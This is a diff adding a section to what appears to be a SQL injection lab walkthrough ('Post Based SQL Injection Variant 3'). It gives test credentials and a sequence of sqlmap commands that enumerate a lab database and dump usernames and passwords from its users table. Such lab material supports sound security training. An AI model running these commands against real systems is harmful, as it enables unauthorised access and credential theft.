@@ -195,3 +195,22 @@ python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users --columns
 
 python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users -C id,username,password --dump
 
+## Post Based SQL Injection Variant 3
+### query:
+sign=Capricorn
+
+### task:
+You have valid credentials for this login page (Username: test2@test.com; Password: pass). Your task is to intercept the POST requests and try performing SQL injection manually and by using sqlmap.
+
+copy paste the intercepted request into file called post_sql.txt 
+
+
+python sqlmap.py -r post_sql.txt --dbs
+
+python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 --tables
+
+python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users --columns
+
+ python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users -C id,username,password --dump
+
+
